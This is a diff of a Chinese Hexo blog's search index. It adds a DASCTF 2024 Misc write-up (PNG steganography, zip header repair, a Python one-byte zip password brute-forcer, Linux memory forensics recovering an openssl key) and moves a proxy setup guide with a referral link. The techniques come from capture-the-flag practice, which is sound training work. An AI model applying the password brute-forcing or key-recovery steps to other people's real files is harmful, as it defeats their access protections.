class="number">-1</span>;p&gt;<span class="number">0</span>;p--)</span><br><span class="line">			&#123;</span><br><span class="line">				z = v[p<span class="number">-1</span>];</span><br><span class="line">				v[p] -= ((((z&gt;&gt;<span class="number">5</span>)^(y&lt;&lt;<span class="number">2</span>))+((y&gt;&gt;<span class="number">3</span>)^(z&lt;&lt;<span class="number">4</span>))) ^ ((key[(p&amp;<span class="number">3</span>)^e]^z)+(y ^ sum)));</span><br><span class="line">				y = v[p];</span><br><span class="line">			&#125;</span><br><span class="line">			z = v[n<span class="number">-1</span>];</span><br><span class="line">			v[<span class="number">0</span>] -= (((key[(p^e)&amp;<span class="number">3</span>]^z)+(y ^ sum)) ^ (((y&lt;&lt;<span class="number">2</span>)^(z&gt;&gt;<span class="number">5</span>))+((z&lt;&lt;<span class="number">4</span>)^(y&gt;&gt;<span class="number">3</span>))));</span><br><span class="line">			y = v[<span class="number">0</span>];</span><br><span class="line">			sum -= delta;</span><br><span class="line">		&#125;<span class="keyword">while</span>(--rounds);</span><br><span class="line">		rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">		y = v[<span class="number">0</span>];</span><br><span class="line">		sum = rounds*delta;</span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			e = sum &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span>;</span><br><span class="line">			<span class="keyword">for</span>(p=n<span class="number">-1</span>;p&gt;<span class="number">0</span>;p--)</span><br><span class="line">			&#123;</span><br><span class="line">				z = v[p<span class="number">-1</span>];</span><br><span class="line">				v[p] -= ((((z&gt;&gt;<span class="number">5</span>)^(y&lt;&lt;<span class="number">2</span>))+((y&gt;&gt;<span class="number">3</span>)^(z&lt;&lt;<span class="number">4</span>))) ^ ((key2[(p&amp;<span class="number">3</span>)^e]^z)+(y ^ sum)));</span><br><span class="line">				y = v[p];</span><br><span class="line">			&#125;</span><br><span class="line">			z = v[n<span class="number">-1</span>];</span><br><span class="line">			v[<span class="number">0</span>] -= (((key2[(p^e)&amp;<span class="number">3</span>]^z)+(y ^ sum)) ^ (((y&lt;&lt;<span class="number">2</span>)^(z&gt;&gt;<span class="number">5</span>))+((z&lt;&lt;<span class="number">4</span>)^(y&gt;&gt;<span class="number">3</span>))));</span><br><span class="line">			y = v[<span class="number">0</span>];</span><br><span class="line">			sum = sum-delta;</span><br><span class="line">		&#125;<span class="keyword">while</span>(--rounds);</span><br><span class="line">		w[<span class="number">2</span>*o]=v[<span class="number">0</span>];</span><br><span class="line">		w[<span class="number">2</span>*o+<span class="number">1</span>]=v[<span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c&quot;</span>,*((<span class="type">char</span>*)&amp;w[i]+<span class="number">0</span>),*((<span class="type">char</span>*)&amp;w[i]+<span class="number">1</span>),*((<span class="type">char</span>*)&amp;w[i]+<span class="number">2</span>),*((<span class="type">char</span>*)&amp;w[i]+<span class="number">3</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>题解</category>
+      </categories>
+      <tags>
+        <tag>Misc</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>记录自用的终端美化方案</title>
     <url>//post/BeautifyBash/</url>
     <content><![CDATA[<p><s>生产队的驴准备为自己选一个更趁手的磨盘</s>，所谓工作环境当然要赏心悦目才能更高效，下面分享一下自己在用的终端美化方案</p>
@@ -1965,6 +1736,235 @@ hook密文，发现密文没有改变，那改变的可能是输入的flag数据
       <categories>
         <category>环境配置</category>
       </categories>
+  </entry>
+  <entry>
+    <title>DASCTF 2024暑期挑战赛 Misc部分WP</title>
+    <url>//post/DASCTF2407/</url>
+    <content><![CDATA[<h3 id="png-master">png_master</h3>
+<p><a class="link"   href="https://zh.wikipedia.org/wiki/PNG" >PNG文件结构-维基百科<i class="fas fa-external-link-alt"></i></a></p>
+<ul>
+<li><code>IDAT</code>块是储存图像数据的块，在这个块中存放在图像真正的数据信息，IDAT 块只有当上一个块充满（正常length最大65524）时，才会继续一个新的块</li>
+<li>完整的图像数据由一个单独的<code>zlib datastream</code>表示，它储存在一个<code>IDAT</code>块中</li>
+<li>一个png文件中无论有多少个<code>IDAT</code>区块，在<code>IDAT</code>块中只会出现一个<code>zlib</code>块</li>
+<li><code>789C</code>在png文件中为<code>zlib</code>的标志位</li>
+<li>一个<code>zlib</code>数据块只有一个标志位，即只会出现一次<code>789C</code></li>
+</ul>
+<p>flag第一段藏在png文件末尾，base64解码后获得<code>DASCTF&#123;2fd9e9ff-e27</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_14-24-09.png"
+                        alt="Clip_2024-07-23_14-24-09"
+                 ></p>
+<p>binwalk和zsteg都会提示png后有额外块，也可以使用<code>pngcheck -v</code>检查每个IDAT块是否有错误</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_14-34-41.png"
+                        alt="Clip_2024-07-23_14-34-41"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_14-35-03.png"
+                        alt="Clip_2024-07-23_14-35-03"
+                 ></p>
+<p>在010中把有问题的IDAT块复制，找一张png图片，取其文件头尾，将IDAT块复制出，作为一张新的图片，但因为宽高不知，用Puzzle Solver进行宽高爆破，得到宽高是500*500，获得flag   <code>a19131f86216&#125;</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/500X500_2_3_8.png"
+                        alt="500X500_2_3_8"
+                 ></p>
+<p>StegSlove中可以看到Alpha通道有东西</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-25-34.png"
+                        alt="Clip_2024-07-23_15-25-34"
+                 ></p>
+<p>尝试后可以找到中间段flag  <code>d-5405-c5f5-</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-26-38.png"
+                        alt="Clip_2024-07-23_15-26-38"
+                 ></p>
+<h3 id="EZ-zip">EZ_zip</h3>
+<p><a class="link"   href="https://hello-ctf.com/HC_MISC/Archivefile/#zip" >压缩包文件结构<i class="fas fa-external-link-alt"></i></a></p>
+<p>直接解压会报错，010打开模板报错，发现解压文件长度不对，可以看到<code>320.zip</code>长度应该为7（文件长度要加后缀长度），修改为7，要将文件头和目录区长度都修改</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-47-29.png"
+                        alt="Clip_2024-07-23_15-47-29"
+                 ></p>
+<p>解压后提示CRC校验错误，参照着DirEntry改动record段，可以发现是解压方法被改成了store，跟压缩方法对不上，修改解压方式</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-58-20.png"
+                        alt="Clip_2024-07-23_15-58-20"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-00-23.png"
+                        alt="Clip_2024-07-23_16-00-23"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-00-36.png"
+                        alt="Clip_2024-07-23_16-00-36"
+                 ></p>
+<p>修改后可以正常进行解压得到<code>320.zip</code>，查看压缩文件注释可以得到密码的提示<code>just a byte</code>，密码为一个字节，可以使用python进行爆破。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyzipper</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">320</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    zip_filename = <span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span></span><br><span class="line">    zf = pyzipper.AESZipFile(zip_filename, <span class="string">&#x27;r&#x27;</span>, compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0xff</span>+<span class="number">1</span>):</span><br><span class="line">        password = j.to_bytes(length=<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        zf.setpassword(password)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            zf.extractall()</span><br><span class="line">            zf.close()</span><br><span class="line">            os.remove(<span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<p>解压得到一个txt，提示加密方法为AES-ECB，并提示key可能在前面的过程中就出现了</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-03-17.png"
+                        alt="Clip_2024-07-23_16-03-17"
+                 ></p>
+<p>联想到前面解压密码是字节形式，通过打印解压密码发现</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyzipper</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">key = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">320</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    zip_filename = <span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span></span><br><span class="line">    zf = pyzipper.AESZipFile(zip_filename, <span class="string">&#x27;r&#x27;</span>, compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0xff</span>+<span class="number">1</span>):</span><br><span class="line">        password = j.to_bytes(length=<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        zf.setpassword(password)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            zf.extractall()</span><br><span class="line">            key += password</span><br><span class="line">            zf.close()</span><br><span class="line">            os.remove(<span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(key[::-<span class="number">1</span>].<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>
+<p><code>c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11</code></p>
+<p>是循环的一个64位字符，将其当作key解密AES得到flag</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-04-42.png"
+                        alt="Clip_2024-07-23_16-04-42"
+                 ></p>
+<h3 id="ServerMeM">ServerMeM</h3>
+<p>题面信息如下</p>
+<blockquote>
+<p>公司的服务器遭受了黑客的攻击，经过勘察黑客为维持权限留下了后门，我们获取到了服务器的内存文件，请你分析黑客留下的痕迹</p>
+</blockquote>
+<p>下载附件并解压得到：out.lime、System.map</p>
+<p>在WSL中用以下命令搜索一下得到Linux内核的版本号，因此很明显就是Linux内存取证了</p>
+<blockquote>
+<p>strings mem | grep -i ‘Linux version’ | uniq</p>
+</blockquote>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923181948954.png"
+                        alt="image-20240923181948954"
+                 ></p>
+<p>本题提供两种解法，第一种是常规的通过制作Linux的符号文件来进行取证，另一种就是直接分析内存中的可疑文件</p>
+<h4 id="解法一">解法一</h4>
+<p>Linux内核版本信息如下：</p>
+<blockquote>
+<p>Linux version 5.4.27 (root@localhost.localdomain) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC)) #1 SMP Sun May 26 03:37:06 EDT 2024</p>
+</blockquote>
+<h4 id="解法二">解法二</h4>
+<p>直接在strings的结果中搜索 ”.tar.gz” 后缀的文件，发现有一个S3rCr3t.tar.gz</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923182121568.png"
+                        alt="image-20240923182121568"
+                 ></p>
+<p>知道了文件名后直接在010中搜索，得到了openssl AES加密后的密文（以Salted开头）</p>
+<p>还有openssl的具体版本：1.0.2k</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923182211807.png"
+                        alt="image-20240923182211807"
+                 ></p>
+<p>用CyberChef提取，注意后面的注释不要一起提取出来</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/11111111.png"
+                        alt="11111111"
+                 ></p>
+<p>继续往下查看，可以找到 openssl 加密的密钥：P@ssW0rdddd</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923182320920.png"
+                        alt="image-20240923182320920"
+                 ></p>
+<p>然后只要安装openssl-1.0.2-k，使用得到的密钥解密即可</p>
+<p>具体安装步骤如下，编译完成后openssl可执行文件在apps目录下</p>
+<blockquote>
+<p>wget <a class="link"   href="https://www.openssl.org/source/old/1.0.2/openssl-1.0.2k.tar.gz" >https://www.openssl.org/source/old/1.0.2/openssl-1.0.2k.tar.gz<i class="fas fa-external-link-alt"></i></a></p>
+<p>tar -xzvf openssl-1.0.2k.tar.gz</p>
+<p>cd openssl-1.0.2k.tar.gz</p>
+<p>./config --prefix=/usr/</p>
+<p>make</p>
+</blockquote>
+<p>使用以下命令解密即可得到flag：DASCTF{c086cd55-b86a-4ee6-8933-c8bee578148a}</p>
+<blockquote>
+<p>./openssl-1.0.2k/apps/openssl enc -d -aes256 -in download.bin -out flag.tar.gz -k P@ssW0rdddd</p>
+</blockquote>
+<h3 id="ez-wav">ez_wav</h3>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/das240711.png"
+                        alt="das240711"
+                 ></p>
+<p>打开key.grc</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/das240712.png"
+                        alt="das240712"
+                 ></p>
+<p>可知key文件经过如上流程变成look.txt文件。我们需要根据这个流程逆回key文件</p>
+<blockquote>
+<p>信号源——》xor-&gt;数据类型转换-&gt;相乘一个常数-&gt;写入</p>
+<p>下面的Vector Source提供的一个脉冲信号</p>
+</blockquote>
+<p>exp如下</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/04e83e72-8324-40b3-8d14-0cf50565178e.png"
+                        alt="04e83e72-8324-40b3-8d14-0cf50565178e"
+                 ></p>
+<p>010打开后得到密码 good_job</p>
+<p>打开flag.grc</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/2fba9b78-9356-4852-aa1a-8aadee4dee85.png"
+                        alt="2fba9b78-9356-4852-aa1a-8aadee4dee85"
+                 ></p>
+<p>如果我们想要抵消载波的影响，那么就需要给他相乘一个相反的波形，下面是AM解调过程</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/8209f61b-1618-48de-8084-75189f5b1fa8.png"
+                        alt="8209f61b-1618-48de-8084-75189f5b1fa8"
+                 ></p>
+<p>如果我们想要抵消载波的影响，那么就需要给他相乘一个相反的波形，下面是AM解调过程</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/4bda376f-8a5f-450b-88b4-357a057b85e2.png"
+                        alt="4bda376f-8a5f-450b-88b4-357a057b85e2"
+                 ></p>
+<p>如果我们想要抵消载波的影响，那么就需要给他相乘一个相反的波形，下面是AM解调过程</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/893acd65-17e9-48ab-9221-b84a454b27c0.png"
+                        alt="893acd65-17e9-48ab-9221-b84a454b27c0"
+                 ></p>
+<p>听flag即可</p>
+]]></content>
+      <categories>
+        <category>题解</category>
+      </categories>
+      <tags>
+        <tag>Misc</tag>
+      </tags>
   </entry>
   <entry>
     <title>使用Hexo和Github Page搭建静态博客</title>
@@ -2265,6 +2265,92 @@ hook密文，发现密文没有改变，那改变的可能是输入的flag数据
       </tags>
   </entry>
   <entry>
+    <title>科学上网指北</title>
+    <url>//post/VPNuse/</url>
+    <content><![CDATA[<h1>仅供学术讨论使用 造成任何后果自负</h1>
+<h3 id="代理软件">代理软件</h3>
+<h4 id="Clash-Verge">Clash Verge</h4>
+<p>GitHub Releases地址：<a class="link"   href="https://github.com/clash-verge-rev/clash-verge-rev/releases" >Releases · clash-verge-rev/clash-verge-rev<i class="fas fa-external-link-alt"></i></a></p>
+<p>适用于Windows、MacOS、Linux</p>
+<h4 id="Clash-Meta-For-Android">Clash Meta For Android</h4>
+<p>GitHub Releases地址：<a class="link"   href="https://github.com/MetaCubeX/ClashMetaForAndroid/releases" >Releases · MetaCubeX/ClashMetaForAndroid<i class="fas fa-external-link-alt"></i></a></p>
+<p>适用于Android</p>
+<h4 id="Surfboard">Surfboard</h4>
+<p><a class="link"   href="https://github.com/getsurfboard/surfboard/releases" >Releases · getsurfboard/surfboard<i class="fas fa-external-link-alt"></i></a></p>
+<p>适用于Android</p>
+<h4 id="Shadowrocket">Shadowrocket</h4>
+<p><a class="link"   href="https://apps.apple.com/us/app/shadowrocket/id932747118" >‎Shadowrocket on the App Store<i class="fas fa-external-link-alt"></i></a> （售价2.99美元不含税）</p>
+<p>注：iOS需美区ID，此处仅提供App Store链接</p>
+<h3 id="机场购买">机场购买</h3>
+<p>此处可使用现有机场或进行新购买，在此推广星云：<a class="link"   href="https://www.xxxlssop.one/#/register?code=iGLGFrhC%EF%BC%8C%E6%9C%80%E4%BD%8E5%E5%85%83/%E6%9C%88%E3%80%82%E6%8E%A5%E4%B8%8B%E6%9D%A5%E6%AD%A5%E9%AA%A4%E5%B0%86%E4%BB%A5Clash" >https://www.xxxlssop.one/#/register?code=iGLGFrhC，最低5元/月。接下来步骤将以Clash<i class="fas fa-external-link-alt"></i></a> For Windows + 星云为例</p>
+<h3 id="配置">配置</h3>
+<ul>
+<li>购买订阅后，在星云仪表盘中选择一键订阅，在展开框中选择复制订阅地址。</li>
+</ul>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250410113702905.png"
+                        alt="image-20250410113702905"
+                 ></p>
+<ul>
+<li>下载并安装完成Clash Verge后，选择左侧第三个订阅，复制订阅地址后选择导入，点击出现的星云方框后左侧会显示蓝色，此时代表选中。</li>
+</ul>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250410113841223.png"
+                        alt="image-20250410113841223"
+                 ></p>
+<ul>
+<li>在左侧第二个代理中选择可连通且延迟较低的节点并选中。顶部可选择：全局代理，所有流量都会经过代理进行访问，规则代理，访问部分网站时会根据已有规则不经代理访问，直连为直接连接，所有流量不走代理。</li>
+</ul>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250410113947586.png"
+                        alt="image-20250410113947586"
+                 ></p>
+<ul>
+<li>General界面中，System Proxy为系统代理开关，开启后状态栏内小猫会变成黄色，其他选项如图配置即可，注意Clash默认端口为7890，和宽带连接上网相同，且由于Clash问题，若宽带连接名称为中文也会失效，故需要使用PPPoE的用户建议修改Clash端口，并将宽带连接名称改为英文，如PPPoE。</li>
+</ul>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240307223716267.png"
+                        alt="image-20240307223716267"
+                 ></p>
+<ul>
+<li>Clash Verge同理，但是Clash Verge默认端口为7897，所以不会存在上述问题</li>
+</ul>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250410114107049.png"
+                        alt="image-20250410114107049"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240307223843654.png"
+                        alt="image-20240307223843654"
+                 ></p>
+<ul>
+<li>配置完成后可访问<a class="link"   href="https://www.google.com/" >Google<i class="fas fa-external-link-alt"></i></a>进行连通性测试，如果成功连通则会正常显示。</li>
+</ul>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240307224342765.png"
+                        alt="image-20240307224342765"
+                 ></p>
+<p>TUN模式：虚拟网卡模式，本机所有流量（包括浏览器、APP、终端、虚拟机等）都会经过一张“虚拟网卡”再进行代理，可以简单理解为“真·全局模式”，但是部分古久版本开启TUN后会使得网络图标变成小地球，新版本会显示为以太网，这些都是正常选项</p>
+]]></content>
+      <categories>
+        <category>环境配置</category>
+      </categories>
+  </entry>
+  <entry>
     <title>如何优雅的重装系统</title>
     <url>//post/SystemReinstall/</url>
     <content><![CDATA[<h3 id="一、事先准备">一、事先准备</h3>
@@ -2429,92 +2515,6 @@ hook密文，发现密文没有改变，那改变的可能是输入的flag数据
 <p>如果在网络连接步骤中选择连接网络并在接下来的步骤登录Microsoft账号，系统用户名则会被自动命名为登录邮箱的前五位，如果选择跳过连接或选择本地帐号登录，则需要自行命名系统用户名，注意：一定要使用英文或数字，<strong>千万不可使用中文，后续会出现很多环境问题报错</strong></p>
 <h3 id="十、优雅的进入系统">十、优雅的进入系统</h3>
 <p>完成上述所有步骤后即可正确进入系统，<s>快进到蓝屏重装</s></p>
-]]></content>
-      <categories>
-        <category>环境配置</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>科学上网指北</title>
-    <url>//post/VPNuse/</url>
-    <content><![CDATA[<h1>仅供学术讨论使用 造成任何后果自负</h1>
-<h3 id="代理软件">代理软件</h3>
-<h4 id="Clash-Verge">Clash Verge</h4>
-<p>GitHub Releases地址：<a class="link"   href="https://github.com/clash-verge-rev/clash-verge-rev/releases" >Releases · clash-verge-rev/clash-verge-rev<i class="fas fa-external-link-alt"></i></a></p>
-<p>适用于Windows、MacOS、Linux</p>
-<h4 id="Clash-Meta-For-Android">Clash Meta For Android</h4>
-<p>GitHub Releases地址：<a class="link"   href="https://github.com/MetaCubeX/ClashMetaForAndroid/releases" >Releases · MetaCubeX/ClashMetaForAndroid<i class="fas fa-external-link-alt"></i></a></p>
-<p>适用于Android</p>
-<h4 id="Surfboard">Surfboard</h4>
-<p><a class="link"   href="https://github.com/getsurfboard/surfboard/releases" >Releases · getsurfboard/surfboard<i class="fas fa-external-link-alt"></i></a></p>
-<p>适用于Android</p>
-<h4 id="Shadowrocket">Shadowrocket</h4>
-<p><a class="link"   href="https://apps.apple.com/us/app/shadowrocket/id932747118" >‎Shadowrocket on the App Store<i class="fas fa-external-link-alt"></i></a> （售价2.99美元不含税）</p>
-<p>注：iOS需美区ID，此处仅提供App Store链接</p>
-<h3 id="机场购买">机场购买</h3>
-<p>此处可使用现有机场或进行新购买，在此推广星云：<a class="link"   href="https://www.xxxlssop.one/#/register?code=iGLGFrhC%EF%BC%8C%E6%9C%80%E4%BD%8E5%E5%85%83/%E6%9C%88%E3%80%82%E6%8E%A5%E4%B8%8B%E6%9D%A5%E6%AD%A5%E9%AA%A4%E5%B0%86%E4%BB%A5Clash" >https://www.xxxlssop.one/#/register?code=iGLGFrhC，最低5元/月。接下来步骤将以Clash<i class="fas fa-external-link-alt"></i></a> For Windows + 星云为例</p>
-<h3 id="配置">配置</h3>
-<ul>
-<li>购买订阅后，在星云仪表盘中选择一键订阅，在展开框中选择复制订阅地址。</li>
-</ul>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250410113702905.png"
-                        alt="image-20250410113702905"
-                 ></p>
-<ul>
-<li>下载并安装完成Clash Verge后，选择左侧第三个订阅，复制订阅地址后选择导入，点击出现的星云方框后左侧会显示蓝色，此时代表选中。</li>
-</ul>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250410113841223.png"
-                        alt="image-20250410113841223"
-                 ></p>
-<ul>
-<li>在左侧第二个代理中选择可连通且延迟较低的节点并选中。顶部可选择：全局代理，所有流量都会经过代理进行访问，规则代理，访问部分网站时会根据已有规则不经代理访问，直连为直接连接，所有流量不走代理。</li>
-</ul>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250410113947586.png"
-                        alt="image-20250410113947586"
-                 ></p>
-<ul>
-<li>General界面中，System Proxy为系统代理开关，开启后状态栏内小猫会变成黄色，其他选项如图配置即可，注意Clash默认端口为7890，和宽带连接上网相同，且由于Clash问题，若宽带连接名称为中文也会失效，故需要使用PPPoE的用户建议修改Clash端口，并将宽带连接名称改为英文，如PPPoE。</li>
-</ul>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240307223716267.png"
-                        alt="image-20240307223716267"
-                 ></p>
-<ul>
-<li>Clash Verge同理，但是Clash Verge默认端口为7897，所以不会存在上述问题</li>
-</ul>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250410114107049.png"
-                        alt="image-20250410114107049"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240307223843654.png"
-                        alt="image-20240307223843654"
-                 ></p>
-<ul>
-<li>配置完成后可访问<a class="link"   href="https://www.google.com/" >Google<i class="fas fa-external-link-alt"></i></a>进行连通性测试，如果成功连通则会正常显示。</li>
-</ul>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240307224342765.png"
-                        alt="image-20240307224342765"
-                 ></p>
-<p>TUN模式：虚拟网卡模式，本机所有流量（包括浏览器、APP、终端、虚拟机等）都会经过一张“虚拟网卡”再进行代理，可以简单理解为“真·全局模式”，但是部分古久版本开启TUN后会使得网络图标变成小地球，新版本会显示为以太网，这些都是正常选项</p>
 ]]></content>
       <categories>
         <category>环境配置</category>
@@ -4104,26 +4104,6 @@ or summary contain a given string such as “spam”, type “modules spam”.</
       </tags>
   </entry>
   <entry>
-    <title>2024 楚彗杯 超级WriteUp</title>
-    <url>//post/sbchb666/</url>
-    <content><![CDATA[<p><a class="link"   href="https://blog.jacki.cn/2024/11/29/%E5%A4%A9%E5%B1%B1%E5%9B%BA%E7%BD%91/#CRYPTO-ddd" >2024 天山固网杯决赛 部分WP - m0h31h31<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://dexterjie.github.io/2024/12/01/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%A6%8F%E5%BB%BA%E7%9C%81%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/" >2024第二届福建省数据安全大赛<i class="fas fa-external-link-alt"></i></a></p>
